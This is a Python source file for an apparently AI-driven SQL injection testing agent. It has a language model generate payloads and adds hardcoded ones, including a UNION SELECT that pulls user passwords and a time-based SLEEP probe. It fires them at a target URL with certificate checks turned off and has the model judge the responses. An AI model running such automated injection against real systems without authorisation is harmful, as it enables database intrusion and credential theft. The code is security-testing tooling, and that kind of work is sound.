from typing import Dict, Any, Optional
import requests
from datetime import datetime
import logging
from ..agent import Agent
from ..task import Task
import os
from openai import OpenAI

class SQLInjectionAgent(Agent):
    """AI-powered agent for SQL injection testing."""
    
    def __init__(self):
        super().__init__(
            id="sql-agent-1",
            name="SQL Injection Agent",
            capabilities={"sql_injection", "web_security"}
        )
        self.logger = logging.getLogger(__name__)
        self.client = OpenAI(api_key=self.api_key)
        
    def _execute_specific_test(self, task: Task) -> Dict[str, Any]:
        """Execute SQL injection testing with AI guidance."""
        self.logger.info(f"Starting SQL injection test for task {task.id}")
        
        target = task.parameters.get("target")
        session = task.parameters.get("session")
        
        if not target or not session:
            raise ValueError("Target URL or session not specified")
            
        findings = []
        
        # Get AI-generated test payloads
        payloads_response = self.client.chat.completions.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "system", "content": "You are a security expert. Generate a list of SQL injection payloads for testing."},
                {"role": "user", "content": "Generate 5 SQL injection payloads for testing login forms."}
            ]
        )
        
        ai_payloads = payloads_response.choices[0].message.content.split("\n")
        
        # Combine AI-generated payloads with known effective ones
        test_payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT user,password FROM users -- -",
            "1' AND SLEEP(5) -- -",
            *ai_payloads
        ]
        
        for payload in test_payloads:
            try:
                # Get AI guidance for this specific payload
                strategy_response = self.client.chat.completions.create(
                    model="gpt-3.5-turbo",
                    messages=[
                        {"role": "system", "content": "You are a security expert. Suggest how to test this SQL injection payload effectively."},
                        {"role": "user", "content": f"How should I test this payload: {payload}"}
                    ]
                )
                
                self.logger.info(f"Testing payload: {payload}")
                
                # Execute the test
                response = session.get(
                    target,
                    params={
                        "id": payload,
                        "Submit": "Submit"
                    },
                    verify=False,
                    timeout=10
                )
                
                # Let AI analyze the response
                analysis_response = self.client.chat.completions.create(
                    model="gpt-3.5-turbo",
                    messages=[
                        {"role": "system", "content": "You are a security expert. Analyze this response for signs of SQL injection vulnerability."},
                        {"role": "user", "content": f"Response content: {response.text}\nStatus code: {response.status_code}\nResponse time: {response.elapsed.total_seconds()}"}
                    ]
                )
                
                analysis = analysis_response.choices[0].message.content
                
                if "vulnerability" in analysis.lower() or "successful" in analysis.lower():
                    findings.append({
                        "name": "SQL Injection Vulnerability",
                        "severity": "high",
                        "description": f"SQL injection vulnerability detected with payload: {payload}",
                        "ai_analysis": analysis,
                        "remediation": "Implement proper input validation and use parameterized queries",
                        "evidence": response.text[:200]
                    })
                    
            except Exception as e:
                self.logger.error(f"Error testing payload {payload}: {str(e)}")
                
        return {
            "status": "completed",
            "findings": findings,
            "timestamp": datetime.now().isoformat()
        }
        
    async def analyze_results(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Use AI to analyze test results and provide recommendations."""
        try:
            analysis_response = await self.client.chat.completions.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": "You are a security expert specialized in SQL injection. Analyze these test results and provide detailed recommendations."},
                    {"role": "user", "content": str(results)}
                ]
            )
            
            return {
                "summary": analysis_response.choices[0].message.content,
                "timestamp": datetime.now().isoformat(),
                "findings_count": len(results.get("findings", [])),
                "risk_level": "High" if results.get("findings") else "Low"
            }
            
        except Exception as e:
            self.logger.error(f"Error in AI analysis: {str(e)}")
            return {
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            } 